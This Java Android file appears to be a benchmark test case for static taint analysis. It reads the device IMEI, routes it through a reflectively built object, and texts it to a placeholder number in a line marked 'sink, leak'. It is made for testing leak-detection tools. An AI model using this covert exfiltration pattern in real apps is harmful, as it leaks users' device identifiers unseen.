package lu.uni.snt.reflection6;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.Menu;

/**
 * @testcase_name Reflection10
 * @version 0.1
 * @author SnT, University of Luxembourg 
 * @author_mail li.li@uni.lu
 * 
 * @description A class instance is created using reflection with specific constructor (getConstructors). 
 * Sensitive data is stored through a constructor and then signed into a field of this class 
 * and afterwords directly read out again and leaked.
 * @dataflow onCreate: source -> bc.imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle constructor-based reflective class instantiations.
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		String deviceid = telephonyManager.getDeviceId(); //source
		
		try {
			Class<?> cls = Class.forName("lu.uni.snt.reflection6.ConcreteClass");
			
			Constructor<?>[] constructors = cls.getConstructors();
			
			if (constructors.length <= 0)
			{
				throw new RuntimeException("No constructor methods.");
			}
			
			BaseClass bc = (BaseClass) constructors[0].newInstance(deviceid);
			
			SmsManager sms = SmsManager.getDefault();
	        sms.sendTextMessage("+49 1234", null, bc.imei, null, null);   //sink, leak
		} catch (InstantiationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalAccessException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (ClassNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IllegalArgumentException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (InvocationTargetException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
